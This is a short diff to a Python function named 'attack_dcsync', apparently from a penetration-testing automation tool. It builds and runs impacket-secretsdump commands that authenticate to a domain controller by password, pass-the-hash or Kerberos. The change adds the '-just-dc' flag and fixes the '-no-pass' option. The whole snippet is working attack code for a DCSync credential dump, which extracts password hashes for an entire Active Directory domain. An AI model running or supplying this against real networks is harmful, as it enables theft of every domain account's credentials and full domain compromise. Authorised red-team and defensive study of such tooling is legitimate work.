@@ -13,16 +13,16 @@ def attack_dcsync(session):
 
     if session.hash:
         cmd = (
-            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} "
+            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} -just-dc "
             f"-hashes :{session.hash}"
         )
     elif session.password:
         cmd = (
-            f"impacket-secretsdump {session.domain}/{session.username}:{session.password}@{session.dc_ip}"
+            f"impacket-secretsdump {session.domain}/{session.username}:{session.password}@{session.dc_ip} -just-dc "
         )
     else:
         cmd = (
-            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} -k --no-pass"
+            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} -k -no-pass -just-dc"
         )
 
     out, err = run_command(cmd)
